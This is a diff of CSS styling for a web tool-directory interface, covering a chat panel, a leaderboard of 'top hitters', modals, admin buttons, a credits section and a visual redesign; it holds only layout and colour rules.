-  .gag2-suggestion-handle, .suggestion-handle { font-size: 0.75rem; color: var(--neon); }
-  .suggestion-id { font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; color: var(--muted); }
-
-  /* ═══ LIVE CHAT ═══ */
-  .chat-toggle {
-    position: fixed;
-    bottom: 1.5rem;
-    right: 1.5rem;
-    width: 52px; height: 52px;
-    background: var(--neon);
-    border: none;
-    border-radius: 50%;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 1.3rem;
-    z-index: 800;
-    box-shadow: var(--neon-glow), 0 4px 15px rgba(0,0,0,0.4);
-    transition: transform 0.2s;
-  }
-  .chat-toggle:hover { transform: scale(1.1); }
-  .chat-unread {
-    position: absolute;
-    top: -2px; right: -2px;
-    width: 18px; height: 18px;
-    background: #ff4444;
-    border-radius: 50%;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.6rem;
-    color: white;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    display: none;
-  }
-  .chat-panel {
-    position: fixed;
-    bottom: 5.5rem;
-    right: 1.5rem;
-    width: 340px;
-    height: 440px;
-    background: var(--panel);
-    border: 1px solid var(--neon);
-    border-radius: 14px;
-    display: flex;
-    flex-direction: column;
-    z-index: 800;
-    box-shadow: 0 0 30px rgba(255,30,30,0.2), 0 8px 30px rgba(0,0,0,0.5);
-    animation: fadeUp 0.25s ease both;
-    overflow: hidden;
-  }
-  .chat-panel.hidden { display: none; }
-  .chat-header {
-    padding: 0.75rem 1rem;
-    background: var(--surface);
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-  }
-  .chat-header-title {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.12em;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    flex: 1;
-  }
-  .chat-online {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem;
-    color: var(--green);
-    display: flex;
-    align-items: center;
-    gap: 0.3rem;
-  }
-  .chat-online-dot {
-    width: 6px; height: 6px;
-    border-radius: 50%;
-    background: var(--green);
-    animation: blink 2s infinite;
-  }
-  .chat-messages {
-    flex: 1;
-    overflow-y: auto;
-    padding: 0.8rem;
-    display: flex;
-    flex-direction: column;
-    gap: 0.6rem;
-    scrollbar-width: thin;
-    scrollbar-color: var(--border) transparent;
-  }
-  .chat-messages::-webkit-scrollbar { width: 3px; }
-  .chat-messages::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
-  .chat-msg {
-    display: flex;
-    gap: 0.5rem;
-    align-items: flex-start;
-  }
-  .chat-msg-avatar {
-    width: 26px; height: 26px;
-    border-radius: 50%;
-    object-fit: cover;
-    flex-shrink: 0;
-    background: var(--surface);
-    border: 1px solid var(--border);
-  }
-  .chat-msg-body { flex: 1; min-width: 0; }
-  .chat-msg-name-row {
-    display: flex;
-    align-items: center;
-    gap: 0.35rem;
-    margin-bottom: 0.2rem;
-    flex-wrap: wrap;
-  }
-  .chat-msg-name {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.7rem;
-    font-weight: bold;
-    color: var(--neon);
-  }
-  .chat-role-badge {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.55rem;
-    padding: 1px 4px;
-    border-radius: 3px;
-    text-transform: uppercase;
-    letter-spacing: 0.04em;
-    font-weight: bold;
-    flex-shrink: 0;
-  }
-  .chat-msg-text {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    color: var(--text);
-    line-height: 1.4;
-    word-break: break-word;
-  }
-  .chat-msg-time {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem;
-    color: var(--muted);
-    margin-top: 0.1rem;
-  }
-  .chat-system-msg {
-    text-align: center;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem;
-    color: var(--muted);
-    font-style: italic;
-  }
-  .chat-input-area {
-    padding: 0.7rem;
-    border-top: 1px solid var(--border);
-    background: var(--surface);
-    display: flex;
-    gap: 0.5rem;
-  }
-  .chat-input {
-    flex: 1;
-    background: var(--bg);
-    border: 1px solid var(--border);
-    border-radius: 7px;
-    padding: 0.4rem 0.7rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    outline: none;
-    transition: border-color 0.2s;
-  }
-  .chat-input:focus { border-color: var(--neon); }
-  .chat-input::placeholder { color: var(--muted); }
-  .chat-send {
-    padding: 0.4rem 0.7rem;
-    background: var(--neon);
-    border: none;
-    border-radius: 7px;
-    color: black;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    font-weight: bold;
-    transition: opacity 0.2s;
-    white-space: nowrap;
-  }
-  .chat-send:hover { opacity: 0.85; }
-  .chat-login-prompt {
-    padding: 0.7rem;
-    border-top: 1px solid var(--border);
-    background: var(--surface);
-    text-align: center;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    color: var(--muted);
-  }
-  .chat-login-prompt button {
-    margin-top: 0.4rem;
-    padding: 0.35rem 0.8rem;
-    background: var(--discord);
-    border: none;
-    border-radius: 6px;
-    color: white;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    letter-spacing: 0.05em;
-    display: inline-flex;
-    align-items: center;
-    gap: 0.3rem;
-  }
-
-  /* ═══ TOP HITTERS ═══ */
-  .top-hitters-section {
-    margin-top: 2.5rem;
-    width: 100%;
-    max-width: 680px;
-    animation: fadeUp 0.6s ease both 0.4s both;
-  }
-  .top-hitters-header {
-    display: flex;
-    align-items: center;
-    gap: 0.6rem;
-    margin-bottom: 1rem;
-    justify-content: center;
-  }
-  .top-hitters-title {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.75rem;
-    text-transform: uppercase;
-    letter-spacing: 0.22em;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-  }
-  .top-hitters-cards {
-    display: flex;
-    gap: 1rem;
-    justify-content: center;
-    flex-wrap: wrap;
-  }
-  .hitter-card {
-    background: var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 12px;
-    padding: 1.2rem 1rem;
-    width: 180px;
-    text-align: center;
-    position: relative;
-    transition: transform 0.2s, box-shadow 0.2s;
-    overflow: hidden;
-  }
-  .hitter-card::before {
-    content: '';
-    position: absolute;
-    top: 0; left: 0; right: 0;
-    height: 2px;
-    background: linear-gradient(to right, transparent, var(--rank-color, var(--neon)), transparent);
-  }
-  .hitter-card:hover { transform: translateY(-3px); box-shadow: 0 0 20px rgba(255,30,30,0.15); }
-  .hitter-rank {
-    font-size: 1.8rem;
-    font-weight: 700;
-    line-height: 1;
-    margin-bottom: 0.6rem;
-  }
-  .hitter-avatar {
-    width: 48px; height: 48px;
-    border-radius: 50%;
-    object-fit: cover;
-    border: 2px solid var(--rank-color, var(--border));
-    margin: 0 auto 0.6rem;
-    display: block;
-    background: var(--surface);
-  }
-  .hitter-name {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.78rem;
-    color: var(--text);
-    margin-bottom: 0.2rem;
-    white-space: nowrap;
-    overflow: hidden;
-    text-overflow: ellipsis;
-  }
-  .hitter-handle {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.62rem;
-    color: var(--muted);
-    margin-bottom: 0.6rem;
-  }
-  .hitter-count {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 1.1rem;
-    font-weight: bold;
-    color: var(--rank-color, var(--neon));
-    text-shadow: 0 0 8px var(--rank-color, var(--neon));
-  }
-  .hitter-count-label {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.6rem;
-    color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-  }
-  .hitter-empty {
-    color: var(--muted);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.7rem;
-    padding: 1.5rem 0 0.5rem;
-    font-style: italic;
-  }
-  .hitter-card.rank-1 { --rank-color: #ffd700; border-color: #ffd70044; }
-  .hitter-card.rank-2 { --rank-color: #c0c0c0; border-color: #c0c0c044; }
-  .hitter-card.rank-3 { --rank-color: #cd7f32; border-color: #cd7f3244; }
-  .rank-1 .hitter-rank { color: #ffd700; text-shadow: 0 0 12px #ffd700; }
-  .rank-2 .hitter-rank { color: #c0c0c0; text-shadow: 0 0 12px #c0c0c0; }
-  .rank-3 .hitter-rank { color: #cd7f32; text-shadow: 0 0 12px #cd7f32; }
-
-  /* ═══ SERVER GATE MODAL ═══ */
-  .server-gate-box {
-    background: var(--panel);
-    border: 1px solid var(--neon);
-    border-radius: 14px;
-    padding: 2.5rem 2rem;
-    max-width: 420px;
-    width: 90%;
-    text-align: center;
-    box-shadow: 0 0 40px rgba(255,30,30,0.25);
-    animation: fadeUp 0.3s ease both;
-  }
-  .server-gate-box .gate-icon {
-    font-size: 3rem;
-    margin-bottom: 1rem;
-  }
-  .server-gate-box h2 {
-    font-size: 1.4rem;
-    font-weight: 700;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-    margin-bottom: 0.6rem;
-  }
-  .server-gate-box p {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.78rem;
-    color: var(--muted);
-    line-height: 1.7;
-    margin-bottom: 1.5rem;
-  }
-  .server-gate-box .btn-join {
-    display: inline-flex;
-    align-items: center;
-    gap: 0.5rem;
-    padding: 0.7rem 1.4rem;
-    background: var(--discord);
-    border: none;
-    border-radius: 9px;
-    color: white;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.78rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    cursor: pointer;
-    text-decoration: none;
-    transition: background 0.2s;
-    box-shadow: 0 0 14px rgba(88,101,242,0.4);
-    margin-bottom: 0.7rem;
-  }
-  .server-gate-box .btn-join:hover { background: #4752c4; }
-  .server-gate-box .btn-retry {
-    display: block;
-    margin-top: 0.5rem;
-    padding: 0.5rem 1rem;
-    background: rgba(255,30,30,0.1);
-    border: 1px solid var(--neon);
-    border-radius: 8px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    cursor: pointer;
-    transition: background 0.2s;
-    text-shadow: var(--neon-glow);
-    width: 100%;
-  }
-  .server-gate-box .btn-retry:hover { background: rgba(255,30,30,0.22); }
-
-  @media (max-width: 600px) {
-    .tool-selector { flex-direction: column; }
-    .tool-card { width: 90%; }
-    .gag2-admin-grid { grid-template-columns: 1fr; }
-    .tool-icon { height: 60px; }
-    .chat-panel { width: calc(100vw - 3rem); right: 1rem; }
-    .top-hitters-cards { gap: 0.6rem; }
-    .hitter-card { width: 140px; }
-  }
-
-  /* ═══ STATICS HUB MONOCHROME REDESIGN ═══ */
-  .top-bar {
-    height: 68px;
-    padding: 0 1.5rem;
-    background: rgba(5,5,5,0.88);
-    border-bottom: 1px solid #303030;
-  }
-  .top-left {
-    display: flex;
-    align-items: center;
-    gap: 1.5rem;
-    min-width: 0;
-  }
-  .brand-mini {
-    color: #f5f5f5;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 0.92rem;
-    font-weight: 700;
-    letter-spacing: 0.14em;
-    white-space: nowrap;
-  }
-  .brand-mini span {
-    color: #777;
-    font-size: 0.58rem;
-    letter-spacing: 0.18em;
-    margin-left: 0.35rem;
-  }
-  .counter-widget {
-    padding-left: 1.5rem;
-    border-left: 1px solid #303030;
-    letter-spacing: 0.06em;
-  }
-  .counter-widget .counter-num,
-  .top-hitters-title,
-  .ph-title,
-  .out-ph-title,
-  .gag2-ph-title,
-  .tool-name,
-  .chat-header-title {
-    color: #f5f5f5;
-    text-shadow: none;
-  }
-  .counter-dot, .dot, .gag2-dot, .chat-online-dot {
-    background: #f5f5f5;
-    box-shadow: none;
-  }
-  .home-screen {
-    align-items: stretch;
-    justify-content: flex-start;
-    max-width: 1180px;
-    margin: 0 auto;
-    padding: 150px 2rem 4rem;
-    text-align: left;
-  }
-  .home-screen::before {
-    content: '01 / TOOL DIRECTORY';
-    display: block;
-    color: #707070;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.67rem;
-    letter-spacing: 0.18em;
-    margin-bottom: 1.2rem;
-  }
-  .home-title {
-    max-width: 860px;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: clamp(3.6rem, 10vw, 8.8rem);
-    line-height: 0.88;
-    letter-spacing: -0.075em;
-    color: #f5f5f5;
-    text-shadow: none;
-    margin-bottom: 0;
-  }
-  .home-subtitle {
-    max-width: 860px;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: clamp(2.4rem, 6.5vw, 5.8rem);
-    line-height: 0.95;
-    letter-spacing: -0.065em;
-    color: #6e6e6e;
-    text-shadow: none;
-    margin-bottom: 1.25rem;
-  }
-  .home-subtitle-sub {
-    max-width: 600px;
-    font-size: 0.76rem;
-    line-height: 1.7;
-    color: #8d8d8d;
-    letter-spacing: 0.12em;
-    margin-bottom: 2.7rem;
-  }
-  .tool-selector {
-    display: grid;
-    grid-template-columns: repeat(3, minmax(0, 1fr));
-    gap: 1rem;
-    max-width: 980px;
-    justify-content: stretch;
-  }
-  .tool-card {
-    width: auto;
-    min-height: 245px;
-    display: flex;
-    flex-direction: column;
-    justify-content: flex-end;
-    padding: 1.45rem;
-    background: linear-gradient(145deg, #171717, #0c0c0c);
-    border: 1px solid #303030;
-    border-radius: 4px;
-    box-shadow: 0 18px 45px rgba(0,0,0,0.25);
-  }
-  .tool-card::before {
-    height: 100%;
-    width: 3px;
-    right: auto;
-    background: #f5f5f5;
-    transform: scaleY(0);
-    transform-origin: bottom;
-  }
-  .tool-card:hover {
-    border-color: #777;
-    box-shadow: 0 24px 55px rgba(0,0,0,0.5);
-    transform: translateY(-5px);
-  }
-  .tool-card:hover::before { transform: scaleY(1); }
-  .tool-icon {
-    height: 112px;
-    justify-content: flex-start;
-    align-items: flex-start;
-    opacity: 0.75;
-    filter: grayscale(1);
-  }
-  .tool-icon img {
-    max-height: 92px;
-    max-width: 150px;
-  }
-  .tool-name {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.05rem;
-    letter-spacing: 0.04em;
-  }
-  .tool-desc {
-    max-width: 260px;
-    font-size: 0.68rem;
-    line-height: 1.65;
-    color: #888;
-  }
-  .top-hitters-section {
-    max-width: 760px;
-    margin-top: 3.3rem;
-    padding-top: 1.2rem;
-    border-top: 1px solid #303030;
-  }
-  .top-hitters-header {
-    justify-content: flex-start;
-    margin-bottom: 1rem;
-  }
-  .top-hitters-header .dot { display: none; }
-  .top-hitters-title {
-    font-family: 'Space Grotesk', sans-serif;
-    font-weight: 600;
-    letter-spacing: 0.08em;
-  }
-  .hitter-card {
-    background: #111;
-    border-color: #2d2d2d !important;
-    border-radius: 4px;
-  }
-  .hitter-card::before { background: #f5f5f5; }
-  .hitter-card.rank-1,
-  .hitter-card.rank-2,
-  .hitter-card.rank-3 { --rank-color: #f5f5f5; }
-  .rank-1 .hitter-rank,
-  .rank-2 .hitter-rank,
-  .rank-3 .hitter-rank {
-    color: #f5f5f5;
-    text-shadow: none;
-  }
-  .hitter-count { color: #f5f5f5; text-shadow: none; }
-  .hitter-avatar { border-color: #5d5d5d; filter: grayscale(1); }
-  .back-button {
-    top: 84px;
-    left: 1.5rem;
-    border-color: #555;
-    border-radius: 4px;
-    color: #f5f5f5;
-    box-shadow: none;
-  }
-  .back-button:hover {
-    background: #202020;
-    border-color: #f5f5f5;
-    box-shadow: none;
-  }
-  .tool-wrapper { padding-top: 6.5rem; }
-  .tool-header { text-align: left; margin-bottom: 2.5rem; }
-  .tool-header h1 {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: clamp(2rem, 5vw, 3.3rem);
-    letter-spacing: -0.04em;
-    color: #f5f5f5;
-    text-shadow: none;
-  }
-  .tool-header .tagline { color: #777; letter-spacing: 0.1em; }
-  .panel, .gag2-panel {
-    border-color: #2d2d2d;
-    border-radius: 4px;
-    background: #111;
-    box-shadow: 0 14px 35px rgba(0,0,0,0.2);
-  }
-  .ph, .out-ph, .gag2-ph { background: #171717; border-color: #2d2d2d; }
-  .btn-discord {
-    background: #f5f5f5;
-    color: #080808;
-    border-radius: 4px;
-    box-shadow: none;
-  }
-  .btn-discord:hover { background: #cfcfcf; box-shadow: none; }
-  .chat-unread {
-    background: #f5f5f5;
-    color: #080808;
-  }
-  .admin-close {
-    color: #f5f5f5;
-    background: #1c1c1c;
-    border-color: #555;
-  }
-  .admin-close:hover { background: #2c2c2c; }
-  .user-chip { background: #171717; border-color: #353535; border-radius: 4px; }
-  .user-avatar, .user-role-badge { border-color: #777; }
-  .btn-admin, .btn-sm, .btn-copy, .admin-mode-btn, #customBrainrotInput button, #pasteCustomListContainer button,
-  .btn-add-role, .btn-assign-role, .btn-retry {
-    color: #f5f5f5;
-    border-color: #666;
-    background: #1c1c1c;
-    text-shadow: none;
-    border-radius: 4px;
-  }
-  .btn-admin:hover, .btn-sm:hover, .btn-copy:hover, .admin-mode-btn:hover:not(.active),
-  #customBrainrotInput button:hover, #pasteCustomListContainer button:hover, .btn-add-role:hover,
-  .btn-assign-role:hover, .btn-retry:hover { background: #2c2c2c; }
-  .btn-logout, .btn-del-role {
-    color: #d0d0d0;
-    border-color: #555;
-    background: #202020;
-    border-radius: 4px;
-  }
-  .btn-logout:hover, .btn-del-role:hover { background: #303030; }
-  .btn-gen, .gag2-btn-gen {
-    background: #f5f5f5;
-    color: #050505;
-    border-radius: 4px;
-    box-shadow: none;
-  }
-  .btn-gen:hover, .gag2-btn-gen:hover { background: #cfcfcf; box-shadow: none; }
-  .search-input, .txt, .gag2-f-input, .chat-input, .role-name-input, .role-select,
-  #pasteCustomListContainer textarea {
-    background: #0a0a0a;
-    border-color: #353535;
-    border-radius: 4px;
-  }
-  .search-input:focus, .txt:focus, .gag2-f-input:focus, .chat-input:focus,
-  .role-name-input:focus, .role-select:focus, #pasteCustomListContainer textarea:focus {
-    border-color: #bdbdbd;
-    box-shadow: 0 0 0 2px rgba(255,255,255,0.06);
-  }
-  .animal-list, .code-block, .gag2-code-block { background: #0a0a0a; border-color: #303030; }
-  .a-item:hover, .suggestion-item:hover, .gag2-suggestion-item:hover { background: #1b1b1b; }
-  .a-item.on { background: #242424; }
-  .a-item input[type="checkbox"] { border-color: #9b9b9b; background: #101010; }
-  .a-item input[type="checkbox"]:checked { background: #f5f5f5; border-color: #f5f5f5; box-shadow: none; }
-  .badge-og, .badge-secret { color: #e5e5e5; border-color: #666; background: #202020; text-shadow: none; }
-  .gag2-admin-mode-btn.active, .admin-mode-btn.active { background: #f5f5f5; color: #080808; border-color: #f5f5f5; text-shadow: none; }
-  .chat-toggle { background: #f5f5f5; box-shadow: none; border-radius: 4px; }
-  .chat-toggle:hover { transform: translateY(-3px); }
-  .chat-panel, .admin-modal-box, .modal-box, .server-gate-box { border-color: #5f5f5f; border-radius: 4px; box-shadow: 0 25px 70px rgba(0,0,0,0.55); }
-  .chat-header, .chat-input-area, .admin-header { background: #171717; border-color: #303030; }
-  .chat-msg-name, .chat-role-badge { color: #f5f5f5; }
-  .modal-box h2, .admin-header h2, .server-gate-box h2 { color: #f5f5f5; text-shadow: none; }
-  .modal-box, .server-gate-box { background: #111; }
-  .server-gate-box .btn-join { background: #f5f5f5; color: #080808; border-radius: 4px; box-shadow: none; }
-  .server-gate-box .btn-join:hover { background: #cfcfcf; }
-  .admin-tab.active { color: #f5f5f5; text-shadow: none; border-color: #f5f5f5; background: #202020; }
-  .toast.success, .toast.error { color: #f5f5f5; border-color: #777; }
-  .gag2-code-block { color: #f5f5f5; }
-
-  /* Readable UI type; generated script output stays monospace. */
-  body, button, input, textarea, select,
-  .counter-widget, .user-name, .user-role-badge, .btn-logout, .btn-admin,
-  .modal-box p, .btn-cancel, .admin-tab, .role-name-input, .btn-add-role,
-  .role-row-name, .btn-del-role, .admin-section-title, .user-rank-name,
-  .role-select, .btn-assign-role, .admin-empty, .tool-desc, .tool-header .tagline,
-  .ph-title, .lbl, .a-meta, .sel-count, .txt, .hint, .out-ph-title, .btn-copy,
-  .admin-mode-btn, .gag2-ph-title, .gag2-lbl, .gag2-f-input, .gag2-f-hint,
-  .gag2-admin-mode-btn, .gag2-btn-copy, .suggestion-id {
-    font-family: 'DM Sans', sans-serif;
-  }
-  .code-block, .gag2-code-block {
-    font-family: 'Share Tech Mono', monospace;
-  }
-  body [class] {
-    font-family: 'DM Sans', sans-serif;
-  }
-  body .brand-mini, body .home-title, body .home-subtitle,
-  body .tool-name, body .top-hitters-title, body .chat-header-title,
-  body .modal-box h2, body .admin-header h2, body .server-gate-box h2 {
-    font-family: 'Space Grotesk', sans-serif;
-  }
-  body .code-block, body .gag2-code-block {
-    font-family: 'Share Tech Mono', monospace;
-  }
-
-  /* ═══ CREDITS ═══ */
-  .credits-card-mark {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    width: 76px;
-    height: 76px;
-    border: 1px solid #686868;
-    border-radius: 50%;
-    color: #f5f5f5;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 2rem;
-    line-height: 1;
-  }
-  .credits-wrapper {
-    max-width: 980px;
-    margin: 0 auto;
-    padding: 6.5rem 1.5rem 3rem;
-    position: relative;
-    z-index: 1;
-  }
-  .credits-panel {
-    overflow: hidden;
-    background: #111;
-    border: 1px solid #2d2d2d;
-    border-radius: 4px;
-    box-shadow: 0 14px 35px rgba(0,0,0,0.2);
-  }
-  .credits-panel-head {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 1rem;
-    padding: 0.9rem 1.2rem;
-    background: #171717;
-    border-bottom: 1px solid #2d2d2d;
-  }
-  .credits-panel-title {
-    color: #f5f5f5;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 0.85rem;
-    font-weight: 600;
-    letter-spacing: 0.1em;
-    text-transform: uppercase;
-  }
-  .credits-panel-kicker {
-    color: #777;
-    font-size: 0.68rem;
-    letter-spacing: 0.12em;
-    text-transform: uppercase;
-  }
-  .credits-grid {
-    display: grid;
-    grid-template-columns: repeat(2, minmax(0, 1fr));
-    gap: 1rem;
-    padding: 1rem;
-  }
-  .credit-card {
-    display: flex;
-    flex-direction: column;
-    gap: 1rem;
-    min-height: 250px;
-    padding: 1.25rem;
-    background: #0a0a0a;
-    border: 1px solid #303030;
-    border-radius: 4px;
-  }
-  .credit-card-top {
-    display: flex;
-    align-items: center;
-    gap: 0.85rem;
-  }
-  .credit-avatar {
-    width: 64px;
-    height: 64px;
-    flex-shrink: 0;
-    object-fit: cover;
-    border: 1px solid #777;
-    border-radius: 50%;
-    filter: grayscale(1);
-    background: #171717;
-  }
-  .credit-username {
-    color: #f5f5f5;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.15rem;
-    font-weight: 600;
-  }
-  .credit-id {
-    margin-top: 0.25rem;
-    color: #777;
-    font-size: 0.66rem;
-    letter-spacing: 0.04em;
-    overflow-wrap: anywhere;
-  }
-  .credit-role-row {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 0.75rem;
-    padding-top: 0.9rem;
-    border-top: 1px solid #292929;
-  }
-  .credit-role-label,
-  .credit-contribution-label {
-    color: #777;
-    font-size: 0.64rem;
-    letter-spacing: 0.12em;
-    text-transform: uppercase;
-  }
-  .credit-role {
-    padding: 0.35rem 0.6rem;
-    color: #f5f5f5;
-    border: 1px solid #666;
-    border-radius: 3px;
-    font-size: 0.68rem;
-    font-weight: 700;
-    letter-spacing: 0.06em;
-    text-transform: uppercase;
-  }
-  .credit-contribution {
-    margin-top: -0.35rem;
-    color: #b1b1b1;
-    font-size: 0.82rem;
-    line-height: 1.6;
-  }
-
-  @media (max-width: 600px) {
-    .top-bar { padding: 0 0.8rem; }
-    .top-left { gap: 0.8rem; }
-    .brand-mini { font-size: 0.74rem; }
-    .brand-mini span { display: none; }
-    .counter-widget { padding-left: 0.8rem; font-size: 0.58rem; }
-    .home-screen { padding: 120px 1rem 3rem; }
-    .tool-selector { display: flex; flex-direction: column; }
-    .tool-card { width: 100%; min-height: 210px; }
-    .home-title { font-size: clamp(3.1rem, 18vw, 5.5rem); }
-    .home-subtitle { font-size: clamp(2rem, 12vw, 4rem); }
-    .top-hitters-section { margin-top: 2.4rem; }
-    .credits-grid { grid-template-columns: 1fr; }
-    .credits-panel-head { align-items: flex-start; flex-direction: column; }
-  }
-  /* ═══ SIGNAL CONSOLE VISUAL REFRESH ═══ */
   :root {
     --bg: #070a0f;
     --surface: #0d121a;
@@ -1613,14 +29,21 @@
       radial-gradient(circle at 10% 92%, rgba(38, 28, 76, 0.2), transparent 28rem),
       var(--bg);
     color: var(--text);
+    font-family: 'DM Sans', sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
+    position: relative;
   }
   body::before {
-    opacity: 0.46;
+    content: '';
+    position: fixed;
+    inset: 0;
     background-image:
       linear-gradient(rgba(141, 255, 209, 0.035) 1px, transparent 1px),
       linear-gradient(90deg, rgba(141, 255, 209, 0.035) 1px, transparent 1px);
     background-size: 44px 44px;
-    animation: none;
+    pointer-events: none;
+    z-index: 0;
   }
   body::after {
     content: '';
@@ -1630,386 +53,490 @@
     z-index: 0;
     background: linear-gradient(115deg, transparent 0 52%, rgba(141,255,209,0.025) 52.1%, transparent 52.4%);
   }
+
+  /* TOP BAR */
   .top-bar {
+    position: fixed;
+    top: 0; left: 0; right: 0;
     height: 72px;
-    padding: 0 clamp(1rem, 4vw, 3.5rem);
     background: rgba(7, 10, 15, 0.78);
     border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 clamp(1rem, 4vw, 3.5rem);
+    z-index: 500;
+    backdrop-filter: blur(10px);
     box-shadow: 0 14px 40px rgba(0, 0, 0, 0.24);
   }
-  .top-left { gap: clamp(0.8rem, 3vw, 2.4rem); }
+  .top-left { display: flex; align-items: center; gap: clamp(0.8rem, 3vw, 2.4rem); min-width: 0; }
   .brand-mini {
     color: var(--text);
     font-family: 'Space Grotesk', sans-serif;
     font-size: clamp(0.78rem, 1.8vw, 1rem);
-    letter-spacing: 0.18em;
-  }
-  .brand-mini::before {
-    content: '◈';
-    color: var(--neon);
-    margin-right: 0.55rem;
-    font-size: 0.75em;
-  }
-  .brand-mini span { color: var(--muted); }
-  .counter-widget {
-    padding-left: clamp(0.8rem, 2.5vw, 2rem);
-    border-left-color: var(--border);
-    color: var(--muted);
-  }
-  .counter-widget .counter-num { color: var(--neon); text-shadow: var(--neon-glow); }
-  .counter-dot, .dot, .gag2-dot, .chat-online-dot {
-    background: var(--neon);
-    box-shadow: 0 0 12px rgba(141,255,209,0.62);
-  }
-  .btn-discord {
-    background: var(--discord);
-    color: #fff;
-    border-radius: 8px;
-    box-shadow: 0 8px 22px rgba(114,137,218,0.25);
-    font-family: 'Space Grotesk', sans-serif;
     font-weight: 700;
-    letter-spacing: 0.04em;
+    letter-spacing: 0.18em;
+    white-space: nowrap;
   }
-  .btn-discord:hover {
-    background: #879bfa;
-    box-shadow: 0 10px 28px rgba(114,137,218,0.4);
-    transform: translateY(-1px);
-  }
-  .user-chip {
-    background: rgba(18, 26, 37, 0.92);
-    border-color: var(--border);
-    border-radius: 10px;
-    box-shadow: inset 0 1px 0 rgba(255,255,255,0.04);
-  }
-  .user-avatar { border-color: var(--neon); box-shadow: 0 0 14px rgba(141,255,209,0.18); }
-  .home-screen {
-    max-width: 1240px;
-    min-height: 100dvh;
-    padding: clamp(8rem, 15vh, 11rem) clamp(1rem, 5vw, 4rem) 5rem;
-  }
-  .home-screen::before {
-    content: 'STATIC CONSOLE  /  TOOL DIRECTORY';
-    color: var(--neon);
-    opacity: 0.82;
-    letter-spacing: 0.24em;
-  }
-  .home-title {
-    max-width: 1000px;
-    color: var(--text);
-    font-size: clamp(3.4rem, 10vw, 8.5rem);
-    line-height: 0.84;
-    letter-spacing: -0.09em;
-    text-shadow: 0 12px 45px rgba(0,0,0,0.36);
-  }
-  .home-subtitle {
-    color: transparent;
-    background: linear-gradient(100deg, var(--neon), #b7c7ff 70%, #71819a);
-    -webkit-background-clip: text;
-    background-clip: text;
-    font-size: clamp(2.5rem, 6.5vw, 5.7rem);
-    line-height: 0.92;
-    letter-spacing: -0.08em;
-    margin-bottom: 1.3rem;
-  }
-  .home-subtitle-sub {
-    max-width: 680px;
-    color: var(--muted);
-    font-size: 0.72rem;
-    letter-spacing: 0.2em;
-    line-height: 1.8;
-    margin-bottom: 3.1rem;
-  }
-  .tool-selector {
-    grid-template-columns: 1.25fr 1fr 1fr;
-    gap: 1rem;
-    max-width: 1120px;
-  }
-  .tool-card {
-    width: auto;
-    min-height: 285px;
-    padding: 1.5rem;
-    justify-content: flex-end;
-    background: linear-gradient(145deg, rgba(31,46,64,0.92), rgba(12,17,25,0.96)), var(--panel);
-    border: 1px solid var(--border);
-    border-radius: 16px;
-    box-shadow: 0 22px 60px rgba(0,0,0,0.28), inset 0 1px 0 rgba(255,255,255,0.05);
-  }
-  .tool-card:first-child { min-height: 340px; }
-  .tool-card::before {
-    top: 1rem;
-    bottom: 1rem;
-    left: 0;
-    right: auto;
-    width: 3px;
-    height: auto;
-    background: var(--neon);
-    box-shadow: 0 0 22px rgba(141,255,209,0.8);
-    transform: scaleY(0);
-    transform-origin: bottom;
-  }
-  .tool-card::after {
-    content: 'OPEN TOOL  ↗';
-    position: absolute;
-    top: 1.3rem;
-    right: 1.3rem;
-    color: var(--muted);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.58rem;
-    letter-spacing: 0.12em;
